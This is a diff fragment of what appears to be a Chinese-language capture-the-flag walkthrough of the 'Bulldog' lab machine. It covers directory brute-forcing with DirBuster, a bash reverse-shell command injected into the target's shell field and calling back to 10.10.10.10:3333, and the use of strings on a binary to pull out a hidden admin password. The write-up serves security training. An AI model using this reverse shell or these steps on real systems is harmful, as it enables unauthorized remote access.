@@ -11,7 +11,7 @@ DirBuster爆破目錄，發現在/dev/中的source code有提示
 靶機shell欄位:`echo "bash -i >& /dev/tcp/10.10.10.10/3333 0>&1" | bash`  
 查看可疑user，發現bulldogadmin和django，查看bulldogadmin文件，發現可疑目錄/home/bulldogadmin/.hiddenadmindirectory
 從note中發現提示  
-> Literally run the app, give your account password
+> Literally run the app, give your account password >
 用strings查看customPermissionApp，發現奇怪字眼  
 `SUPERultH
 imatePASH
